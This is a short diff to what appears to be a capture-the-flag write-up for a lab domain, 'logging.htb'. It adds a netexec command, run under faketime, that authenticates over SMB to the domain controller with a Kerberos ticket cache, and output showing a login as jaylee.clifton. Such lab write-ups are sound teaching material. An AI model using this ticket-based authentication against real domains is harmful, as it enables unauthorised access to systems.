@@ -662,5 +662,10 @@ Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies
 Then ill convert it to a valid ccache
 
 ```python
-
+faketime -f +7h nxc smb dc01.logging.htb --use-kcache
+SMB         dc01.logging.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:logging.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.logging.htb 445    DC01             [+] LOGGING.HTB\jaylee.clifton from ccache
 ```
+
+And now using this ticket i can auth as this user
+
